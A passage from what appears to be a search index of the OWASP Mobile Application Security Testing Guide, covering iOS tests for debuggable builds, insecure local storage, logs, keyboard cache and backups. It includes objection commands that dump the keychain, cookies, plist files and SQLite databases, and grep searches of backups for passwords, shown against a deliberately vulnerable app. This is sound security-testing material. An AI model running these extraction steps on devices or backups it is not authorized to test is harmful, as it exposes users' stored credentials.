verify the secure screen lock presence.</p>","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0248/#demos","title":"Demos","text":"<p> MASTG-DEMO-0024: Uses of LAContext.canEvaluatePolicy with r2 </p>","tags":["ios","L2","test","MASWE-0008"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0261/","title":"MASTG-TEST-0261: Debuggable Entitlement Enabled in the entitlements.plist","text":"","tags":["ios","R","test","MASWE-0067"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0261/#overview","title":"Overview","text":"<p>The test evaluates whether an iOS application is configured to allow debugging. If an app is debuggable, attackers can leverage debugging tools (see  Debugging) to analyse the runtime behaviour of the app, and potentially compromise sensitive data or functionality.</p>","tags":["ios","R","test","MASWE-0067"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0261/#steps","title":"Steps","text":"<ol> <li>Use  Extracting Entitlements from MachO Binaries to extract entitlements from the binary.</li> <li>Search for the <code>get-task-allow</code> key.</li> </ol>","tags":["ios","R","test","MASWE-0067"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0261/#observation","title":"Observation","text":"<p>The output contains the value of the <code>get-task-allow</code> entitlement.</p>","tags":["ios","R","test","MASWE-0067"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0261/#evaluation","title":"Evaluation","text":"<p>The test fails if the <code>get-task-allow</code> entitlement is <code>true</code>.</p>","tags":["ios","R","test","MASWE-0067"]},{"location":"MASTG/tests/ios/MASVS-RESILIENCE/MASTG-TEST-0261/#demos","title":"Demos","text":"<p> MASTG-DEMO-0036: Debuggable Entitlement Enabled in the entitlements.plist with rabin2 </p>","tags":["ios","R","test","MASWE-0067"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/","title":"MASTG-TEST-0052: Testing Local Data Storage","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0052: Testing Local Data Storage (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#overview","title":"Overview","text":"<p>This test case focuses on identifying potentially sensitive data stored by an application and verifying if it is securely stored. The following checks should be performed:</p> <ul> <li>Analyze data storage in the source code.</li> <li>Be sure to trigger all possible functionality in the application (e.g. by clicking everywhere possible) in order to ensure data generation.</li> <li>Check all application generated and modified files and ensure that the storage method is sufficiently secure.<ul> <li>This includes <code>NSUserDefaults</code>, databases, KeyChain, Internal Storage, External Storage, etc.</li> </ul> </li> </ul> <p>NOTE: For MASVS L1 compliance, it is sufficient to store data unencrypted in the application's internal storage directory (sandbox). For L2 compliance, additional encryption is required using cryptographic keys securely managed in the iOS KeyChain. This includes using envelope encryption (DEK+KEK) or equivalent methods.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#static-analysis","title":"Static Analysis","text":"<p>When you have access to the source code of an iOS app, identify sensitive data that's saved and processed throughout the app. This includes passwords, secret keys, and personally identifiable information (PII), but it may as well include other data identified as sensitive by industry regulations, laws, and company policies. Look for this data being saved via any of the local storage APIs listed below.</p> <p>Make sure that sensitive data is never stored without appropriate protection. For example, authentication tokens should not be saved in <code>NSUserDefaults</code> without additional encryption. Also avoid storing encryption keys in <code>.plist</code> files, hardcoded as strings in code, or generated using a predictable obfuscation function or key derivation function based on stable attributes.</p> <p>Sensitive data should be stored by using the Keychain API (that stores them inside the Secure Enclave), or stored encrypted using envelope encryption. Envelope encryption, or key wrapping, is a cryptographic construct that uses symmetric encryption to encapsulate key material. Data encryption keys (DEK) can be encrypted with key encryption keys (KEK) which must be securely stored in the Keychain. Encrypted DEK can be stored in <code>NSUserDefaults</code> or written in files. When required, application reads KEK, then decrypts DEK. Refer to OWASP Cryptographic Storage Cheat Sheet to learn more about encrypting cryptographic keys.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#keychain","title":"Keychain","text":"<p>The encryption must be implemented so that the secret key is stored in the Keychain with secure settings, ideally <code>kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly</code>. This ensures the usage of hardware-backed storage mechanisms. Make sure that the <code>AccessControlFlags</code> are set according to the security policy of the keys in the KeyChain.</p> <p>Generic examples of using the KeyChain to store, update, and delete data can be found in the official Apple documentation. The official Apple documentation also includes an example of using Touch ID and passcode protected keys.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#filesystem","title":"Filesystem","text":"<p>Using the source code, examine the different APIs used to store data locally. Make sure that any data is properly encrypted based on its sensitivity.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>One way to determine whether sensitive information (like credentials and keys) is stored insecurely without leveraging native iOS functions is to analyze the app's data directory. Triggering all app functionality before the data is analyzed is important because the app may store sensitive data only after specific functionality has been triggered. You can then perform static analysis for the data dump according to generic keywords and app-specific data.</p> <p>The following steps can be used to determine how the application stores data locally on a jailbroken iOS device:</p> <ol> <li>Trigger the functionality that stores potentially sensitive data.</li> <li>Connect to the iOS device and navigate to its Bundle directory (this applies to iOS versions 8.0 and above): <code>/var/mobile/Containers/Data/Application/$APP_ID/</code></li> <li>Execute grep with the data that you've stored, for example: <code>grep -iRn \"USERID\"</code>.</li> <li>If the sensitive data is stored in plaintext, the app fails this test.</li> </ol> <p>You can analyze the app's data directory on a non-jailbroken iOS device by using third-party applications, such as iMazing.</p> <ol> <li>Trigger the functionality that stores potentially sensitive data.</li> <li>Connect the iOS device to your host computer and launch iMazing.</li> <li>Select \"Apps\", right-click the desired iOS application, and select \"Extract App\".</li> <li>Navigate to the output directory and locate <code>$APP_NAME.imazing</code>. Rename it to <code>$APP_NAME.zip</code>.</li> <li>Unpack the ZIP file. You can then analyze the application data.</li> </ol> <p>Note that tools like iMazing don't copy data directly from the device. They try to extract data from the backups they create. Therefore, getting all the app data that's stored on the iOS device is impossible: not all folders are included in backups. Use a jailbroken device or repackage the app with Frida and use a tool like objection to access all the data and files.</p> <p>If you added the Frida library to the app and repackaged it as described in \"Dynamic Analysis on Non-Jailbroken Devices\" (from the \"Tampering and Reverse Engineering on iOS\" chapter), you can use  objection to transfer files directly from the app's data directory or read files in objection as explained in  Host-Device Data Transfer.</p> <p>The Keychain contents can be dumped during dynamic analysis using different tools, see  Dumping KeyChain Data.</p> <p>The path to the Keychain file is</p> <pre><code>/private/var/Keychains/keychain-2.db\n</code></pre> <p>On a non-jailbroken device, you can use objection to dump the Keychain items created and stored by the app.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#dynamic-analysis-with-xcode-and-ios-simulator","title":"Dynamic Analysis with Xcode and iOS simulator","text":"<p>This test is only available on macOS, as Xcode and the iOS simulator is needed.</p> <p>For testing the local storage and verifying what data is stored within it, it's not mandatory to have an iOS device. With access to the source code and Xcode the app can be build and deployed in the iOS simulator. The file system of the current device of the iOS simulator is available in <code>~/Library/Developer/CoreSimulator/Devices</code>.</p> <p>Once the app is running in the iOS simulator, you can navigate to the directory of the latest simulator started with the following command:</p> <pre><code>$ cd ~/Library/Developer/CoreSimulator/Devices/$(\nls -alht ~/Library/Developer/CoreSimulator/Devices | head -n 2 |\nawk '{print $9}' | sed -n '1!p')/data/Containers/Data/Application\n</code></pre> <p>The command above will automatically find the UUID of the latest simulator started. Now you still need to grep for your app name or a keyword in your app. This will show you the UUID of the app.</p> <pre><code>grep -iRn keyword .\n</code></pre> <p>Then you can monitor and verify the changes in the filesystem of the app and investigate if any sensitive information is stored within the files while using the app.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#dynamic-analysis-with-objection","title":"Dynamic Analysis with Objection","text":"<p>You can use the  objection runtime mobile exploration toolkit to find vulnerabilities caused by the application's data storage mechanism. Objection can be used without a Jailbroken device, but it will require patching the iOS Application.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#reading-the-keychain","title":"Reading the Keychain","text":"<p>To use Objection to read the Keychain, execute the following command:</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios keychain dump\nNote: You may be asked to authenticate using the devices passcode or TouchID\nSave the output by adding `--json keychain.json` to this command\nDumping the iOS keychain...\nCreated                    Accessible                      ACL    Type      Account                    Service                                                        Data\n-------------------------  ------------------------------  -----  --------  -------------------------  -------------------------------------------------------------  ------------------------------------\n2020-02-11 13:26:52 +0000  WhenUnlocked                    None   Password  keychainValue              com.highaltitudehacks.DVIAswiftv2.develop                      mysecretpass123\n</code></pre>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#searching-for-binary-cookies","title":"Searching for Binary Cookies","text":"<p>iOS applications often store binary cookie files in the application sandbox. Cookies are binary files containing cookie data for application WebViews. You can use objection to convert these files to a JSON format and inspect the data.</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json\n[\n    {\n        \"domain\": \"highaltitudehacks.com\",\n        \"expiresDate\": \"2051-09-15 07:46:43 +0000\",\n        \"isHTTPOnly\": \"false\",\n        \"isSecure\": \"false\",\n        \"name\": \"username\",\n        \"path\": \"/\",\n        \"value\": \"admin123\",\n        \"version\": \"0\"\n    }\n]\n</code></pre>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#searching-for-property-list-files","title":"Searching for Property List Files","text":"<p>iOS applications often store data in property list (plist) files that are stored in both the application sandbox and the IPA package. Sometimes these files contain sensitive information, such as usernames and passwords; therefore, the contents of these files should be inspected during iOS assessments. Use the <code>ios plist cat plistFileName.plist</code> command to inspect the plist file.</p> <p>To find the file userInfo.plist, use the <code>env</code> command. It will print out the locations of the applications Library, Caches and Documents directories:</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # env\nName               Path\n-----------------  -------------------------------------------------------------------------------------------\nBundlePath         /private/var/containers/Bundle/Application/B2C8E457-1F0C-4DB1-8C39-04ACBFFEE7C8/DVIA-v2.app\nCachesDirectory    /var/mobile/Containers/Data/Application/264C23B8-07B5-4B5D-8701-C020C301C151/Library/Caches\nDocumentDirectory  /var/mobile/Containers/Data/Application/264C23B8-07B5-4B5D-8701-C020C301C151/Documents\nLibraryDirectory   /var/mobile/Containers/Data/Application/264C23B8-07B5-4B5D-8701-C020C301C151/Library\n</code></pre> <p>Go to the Documents directory and list all files using <code>ls</code>.</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ls\nNSFileType      Perms  NSFileProtection                      Read    Write    Owner         Group         Size      Creation                   Name\n------------  -------  ------------------------------------  ------  -------  ------------  ------------  --------  -------------------------  ------------------------\nDirectory         493  n/a                                   True    True     mobile (501)  mobile (501)  192.0 B   2020-02-12 07:03:51 +0000  default.realm.management\nRegular           420  CompleteUntilFirstUserAuthentication  True    True     mobile (501)  mobile (501)  16.0 KiB  2020-02-12 07:03:51 +0000  default.realm\nRegular           420  CompleteUntilFirstUserAuthentication  True    True     mobile (501)  mobile (501)  1.2 KiB   2020-02-12 07:03:51 +0000  default.realm.lock\nRegular           420  CompleteUntilFirstUserAuthentication  True    True     mobile (501)  mobile (501)  284.0 B   2020-05-29 18:15:23 +0000  userInfo.plist\nUnknown           384  n/a                                   True    True     mobile (501)  mobile (501)  0.0 B     2020-02-12 07:03:51 +0000  default.realm.note\n\nReadable: True  Writable: True\n</code></pre> <p>Execute the <code>ios plist cat</code> command to inspect the content of userInfo.plist file.</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios plist cat userInfo.plist\n{\n        password = password123;\n        username = userName;\n}\n</code></pre>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#searching-for-sqlite-databases","title":"Searching for SQLite Databases","text":"<p>iOS applications typically use SQLite databases to store data required by the application. Testers should check the data protection values of these files and their contents for sensitive data. Objection contains a module to interact with SQLite databases. It allows to dump the schema, their tables and query the records.</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # sqlite connect Model.sqlite\nCaching local copy of database file...\nDownloading /var/mobile/Containers/Data/Application/264C23B8-07B5-4B5D-8701-C020C301C151/Library/Application Support/Model.sqlite to /var/folders/4m/dsg0mq_17g39g473z0996r7m0000gq/T/tmpdr_7rvxi.sqlite\nStreaming file from device...\nWriting bytes to destination...\nSuccessfully downloaded /var/mobile/Containers/Data/Application/264C23B8-07B5-4B5D-8701-C020C301C151/Library/Application Support/Model.sqlite to /var/folders/4m/dsg0mq_17g39g473z0996r7m0000gq/T/tmpdr_7rvxi.sqlite\nValidating SQLite database format\nConnected to SQLite database at: Model.sqlite\n\nSQLite @ Model.sqlite &gt; .tables\n+--------------+\n| name         |\n+--------------+\n| ZUSER        |\n| Z_METADATA   |\n| Z_MODELCACHE |\n| Z_PRIMARYKEY |\n+--------------+\nTime: 0.013s\n\nSQLite @ Model.sqlite &gt; select * from Z_PRIMARYKEY\n+-------+--------+---------+-------+\n| Z_ENT | Z_NAME | Z_SUPER | Z_MAX |\n+-------+--------+---------+-------+\n| 1     | User   | 0       | 0     |\n+-------+--------+---------+-------+\n1 row in set\nTime: 0.013s\n</code></pre>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0052/#searching-for-cache-databases","title":"Searching for Cache Databases","text":"<p>By default NSURLSession stores data, such as HTTP requests and responses in the Cache.db database. This database can contain sensitive data, if tokens, usernames or any other sensitive information has been cached. To find the cached information open the data directory of the app (<code>/var/mobile/Containers/Data/Application/&lt;UUID&gt;</code>) and go to <code>/Library/Caches/&lt;Bundle Identifier&gt;</code>. The WebKit cache is also being stored in the Cache.db file. Objection can open and interact with the database with the command <code>sqlite connect Cache.db</code>, as it is a normal SQLite database.</p> <p>It is recommended to disable Caching this data, as it may contain sensitive information in the request or response. The following list below shows different ways of achieving this:</p> <ol> <li>It is recommended to remove Cached responses after logout. This can be done with the provided method by Apple called <code>removeAllCachedResponses</code>    You can call this method as follows:</li> </ol> <p><code>URLCache.shared.removeAllCachedResponses()</code></p> <p>This method will remove all cached requests and responses from Cache.db file.</p> <ol> <li>If you don't need to use the advantage of cookies it would be recommended to just use the .ephemeral configuration property of URLSession, which will disable saving cookies and Caches.</li> </ol> <p>Apple documentation:</p> <p><code>An ephemeral session configuration object is similar to a default session configuration (see default), except that the corresponding session object doesn\u2019t store caches, credential stores, or any session-related data to disk. Instead, session-related data is stored in RAM. The only time an ephemeral session writes data to disk is when you tell it to write the contents of a URL to a file.</code></p> <ol> <li>Cache can be also disabled by setting the Cache Policy to .notAllowed. It will disable storing Cache in any fashion, either in memory or on disk.</li> </ol>","tags":["ios","L1","L2","test","MSTG-STORAGE-1","MSTG-STORAGE-2","masvs-storage-1"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053/","title":"MASTG-TEST-0053: Checking Logs for Sensitive Data","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0053: Checking Logs for Sensitive Data (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-3","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-STORAGE-3","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053/#static-analysis","title":"Static Analysis","text":"<p>Use the following keywords to check the app's source code for predefined and custom logging statements:</p> <ul> <li>For predefined and built-in functions:<ul> <li>NSLog</li> <li>NSAssert</li> <li>NSCAssert</li> <li>fprintf</li> </ul> </li> <li>For custom functions:<ul> <li>Logging</li> <li>Logfile</li> </ul> </li> </ul> <p>A generalized approach to this issue is to use a define to enable <code>NSLog</code> statements for development and debugging, then disable them before shipping the software. You can do this by adding the following code to the appropriate PREFIX_HEADER (*.pch) file:</p> <pre><code>#ifdef DEBUG\n#   define NSLog (...) NSLog(__VA_ARGS__)\n#else\n#   define NSLog (...)\n#endif\n</code></pre>","tags":["ios","L1","L2","test","MSTG-STORAGE-3","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>See  Monitoring System Logs and once you're set up, navigate to a screen that displays input fields that take sensitive user information.</p> <p>After starting one of the methods, fill in the input fields. If sensitive data is displayed in the output, the app fails this test.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-3","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054/","title":"MASTG-TEST-0054: Determining Whether Sensitive Data Is Shared with Third Parties","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Sensitive Data in Network Traffic Capture</li> <li> Undeclared Known Tracking Domains</li> </ul>","tags":["ios","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054/#overview","title":"Overview","text":"<p>Sensitive information might be leaked to third parties by several means. On iOS typically via third-party services embedded in the app.</p> <p>The features these services provide can involve tracking services to monitor the user's behavior while using the app, selling banner advertisements, or improving the user experience.</p> <p>The downside is that developers don't usually know the details of the code executed via third-party libraries. Consequently, no more information than is necessary should be sent to a service, and no sensitive information should be disclosed.</p> <p>Most third-party services are implemented in two ways:</p> <ul> <li>with a standalone library</li> <li>with a full SDK</li> </ul>","tags":["ios","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054/#static-analysis","title":"Static Analysis","text":"<p>To determine whether API calls and functions provided by the third-party library are used according to best practices, review their source code, requested permissions and check for any known vulnerabilities.</p> <p>All data that's sent to third-party services should be anonymized to prevent exposure of PII (Personal Identifiable Information) that would allow the third party to identify the user account. No other data (such as IDs that can be mapped to a user account or session) should be sent to a third party.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Check all requests to external services for embedded sensitive information. To intercept traffic between the client and server, you can perform dynamic analysis by launching a Machine-in-the-Middle (MITM) attack ( Basic Network Monitoring/Sniffing), for example using  Burp Suite or  ZAP. Once you route the traffic through the interception proxy, you can try to sniff the traffic that passes between the app and server. All app requests that aren't sent directly to the server on which the main function is hosted should be checked for sensitive information, such as PII in a tracker or ad service.</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-4","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/","title":"MASTG-TEST-0055: Finding Sensitive Data in the Keyboard Cache","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0055: Finding Sensitive Data in the Keyboard Cache (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-5","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-STORAGE-5","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/#static-analysis","title":"Static Analysis","text":"<ul> <li>Search through the source code for similar implementations, such as</li> </ul> <pre><code>  textObject.autocorrectionType = UITextAutocorrectionTypeNo;\n  textObject.secureTextEntry = YES;\n</code></pre> <ul> <li>Open xib and storyboard files in the <code>Interface Builder</code> of Xcode and verify the states of <code>Secure Text Entry</code> and <code>Correction</code> in the <code>Attributes Inspector</code> for the appropriate object.</li> </ul> <p>The application must prevent the caching of sensitive information entered into text fields. You can prevent caching by disabling it programmatically, using the <code>textObject.autocorrectionType = UITextAutocorrectionTypeNo</code> directive in the desired UITextFields, UITextViews, and UISearchBars. For data that should be masked, such as PINs and passwords, set <code>textObject.secureTextEntry</code> to <code>YES</code>.</p> <pre><code>UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];\ntextField.autocorrectionType = UITextAutocorrectionTypeNo;\n</code></pre>","tags":["ios","L1","L2","test","MSTG-STORAGE-5","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>If a jailbroken iPhone is available, execute the following steps:</p> <ol> <li>Reset your iOS device keyboard cache by navigating to <code>Settings &gt; General &gt; Reset &gt; Reset Keyboard Dictionary</code>.</li> <li>Use the application and identify the functionalities that allow users to enter sensitive data.</li> <li>Retrieve the keyboard cache file with the extension <code>.dat</code> from the following directory and its subdirectories (which might be different for iOS versions before 8.0) by  Accessing the Device Shell: <code>/private/var/mobile/Library/Keyboard/</code></li> <li>Look for sensitive data, such as username, passwords, email addresses, and credit card numbers. If the sensitive data can be obtained via the keyboard cache file, the app fails this test.</li> </ol> <pre><code>UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];\ntextField.autocorrectionType = UITextAutocorrectionTypeNo;\n</code></pre> <p>If you must use a non-jailbroken iPhone:</p> <ol> <li>Reset the keyboard cache.</li> <li>Key in all sensitive data.</li> <li>Use the app again and determine whether autocorrect suggests previously entered sensitive information.</li> </ol>","tags":["ios","L1","L2","test","MSTG-STORAGE-5","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058/","title":"MASTG-TEST-0058: Testing Backups for Sensitive Data","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0058: Testing Backups for Sensitive Data (ios)</p> <p> Send Feedback</p>","tags":["ios","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058/#overview","title":"Overview","text":"","tags":["ios","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058/#static-analysis","title":"Static Analysis","text":"<p>A backup of a device on which a mobile application has been installed will include all subdirectories (except for <code>Library/Caches/</code>) and files in the app's private directory.</p> <p>Therefore, avoid storing sensitive data in plaintext within any of the files or folders that are in the app's private directory or subdirectories.</p> <p>Although all the files in <code>Documents/</code> and <code>Library/Application Support/</code> are always backed up by default, you can exclude files from the backup by calling <code>NSURL setResourceValue:forKey:error:</code> with the <code>NSURLIsExcludedFromBackupKey</code> key.</p> <p>You can use the NSURLIsExcludedFromBackupKey and CFURLIsExcludedFromBackupKey file system properties to exclude files and directories from backups. An app that needs to exclude many files can do so by creating its own subdirectory and marking that directory excluded. Apps should create their own directories for exclusion instead of excluding system-defined directories.</p> <p>Both file system properties are preferable to the deprecated approach of directly setting an extended attribute. All apps running on iOS version 5.1 and later should use these properties to exclude data from backups.</p> <p>The following is sample Objective-C code for excluding a file from a backup on iOS 5.1 and later:</p> <pre><code>- (BOOL)addSkipBackupAttributeToItemAtPath:(NSString *) filePathString\n{\n    NSURL* URL= [NSURL fileURLWithPath: filePathString];\n    assert([[NSFileManager defaultManager] fileExistsAtPath: [URL path]]);\n\n    NSError *error = nil;\n    BOOL success = [URL setResourceValue: [NSNumber numberWithBool: YES]\n                                  forKey: NSURLIsExcludedFromBackupKey error: &amp;error];\n    if(!success){\n        NSLog(@\"Error excluding %@ from backup %@\", [URL lastPathComponent], error);\n    }\n    return success;\n}\n</code></pre> <p>The following is sample Swift code for excluding a file from a backup on iOS 5.1 and later, see Swift excluding files from iCloud backup for more information:</p> <pre><code>enum ExcludeFileError: Error {\n    case fileDoesNotExist\n    case error(String)\n}\n\nfunc excludeFileFromBackup(filePath: URL) -&gt; Result&lt;Bool, ExcludeFileError&gt; {\n    var file = filePath\n\n    do {\n        if FileManager.default.fileExists(atPath: file.path) {\n            var res = URLResourceValues()\n            res.isExcludedFromBackup = true\n            try file.setResourceValues(res)\n            return .success(true)\n\n        } else {\n            return .failure(.fileDoesNotExist)\n        }\n    } catch {\n        return .failure(.error(\"Error excluding \\(file.lastPathComponent) from backup \\(error)\"))\n    }\n}\n</code></pre>","tags":["ios","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2"]},{"location":"MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>In order to test the backup, you obviously need to create one first. The most common way to create a backup of an iOS device is by using iTunes, which is available for Windows, Linux and of course macOS (till macOS Mojave). When creating a backup via iTunes you can always only backup the whole device and not select just a single app. Make sure that the option \"Encrypt local backup\" in iTunes is not set, so that the backup is stored in cleartext on your hard drive.</p> <p>iTunes is not available anymore from macOS Catalina onwards. Managing of an iOS device, including updates, backup and restore has been moved to the Finder app. The approach remains the same, as described above.</p> <p>After the iOS device has been backed up, you need to retrieve the file path of the backup, which are different locations on each OS. The official Apple documentation will help you to locate backups of your iPhone, iPad, and iPod touch.</p> <p>When you want to navigate to the backup folder up to High Sierra you can easily do so. Starting with macOS Mojave you will get the following error (even as root):</p> <pre><code>$ pwd\n/Users/foo/Library/Application Support\n$ ls -alh MobileSync\nls: MobileSync: Operation not permitted\n</code></pre> <p>This is not a permission issue of the backup folder, but a new feature in macOS Mojave. You can solve this problem by granting full disk access to your terminal application by following the explanation on OSXDaily.</p> <p>Before you can access the directory you need to select the folder with the UDID of your device. Check the section \"Obtaining the UDID of an iOS device\" on how to retrieve it.</p> <p>Once you know the UDID you can navigate into this directory and you will find the full backup of the whole device, which does include pictures, app data and whatever might have been stored on the device.</p> <p>Review the data that's in the backed up files and folders. The structure of the directories and file names is obfuscated and will look like this:</p> <pre><code>$ pwd\n/Users/foo/Library/Application Support/MobileSync/Backup/416f01bd160932d2bf2f95f1f142bc29b1c62dcb/00\n$ ls | head -n 3\n000127b08898088a8a169b4f63b363a3adcf389b\n0001fe89d0d03708d414b36bc6f706f567b08d66\n000200a644d7d2c56eec5b89c1921dacbec83c3e\n</code></pre> <p>Therefore, it's not straightforward to navigate through it and you will not find any hints of the app you want to analyze in the directory or file name. You can consider using the iMazing shareware utility to assist here. Perform a device backup with iMazing and use its built-in backup explorer to easily analyze app container contents including original paths and file names.</p> <p>Without iMazing or similar software you may need to resort to using grep to identify sensitive data. This is not the most thorough approach but you can try searching for sensitive data that you have keyed in while using the app before you made the backup. For example: the username, password, credit card data, PII or any data that is considered sensitive in the context of the app.</p> <pre><code>~/Library/Application Support/MobileSync/Backup/&lt;UDID&gt;\ngrep -iRn \"password\" .\n</code></pre> <p>As described in the Static Analysis section, any sensitive data that you're able to find should be excluded from the backup, encrypted properly by using the Keychain or not stored on the device in the first place.</p> <p>To identify if a backup is encrypted, you can check the key named \"IsEncrypted\" from the file \"Manifest.plist\", located at the root of the backup directory. The following example shows a configuration indicating that the backup is encrypted:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n...\n &lt;key&gt;Date&lt;/key&gt;\n &lt;date&gt;2021-03-12T17:43:33Z&lt;/date&gt;\n &lt;key&gt;IsEncrypted&lt;/key&gt;\n &lt;true/&gt;\n...\n&lt;/plist&gt;\n</code></pre> <p>In case you need to work with an encrypted backup, there are some Python scripts in DinoSec's GitHub repo, such as backup_tool.py and backup_passwd.py, that will serve as a good starting point. However, note that they might not work with the latest iTunes/Finder versions and might need to be tweaked.</p> <p>You can also use the tool  iOSbackup to easily read and extract files from a password-encrypted iOS 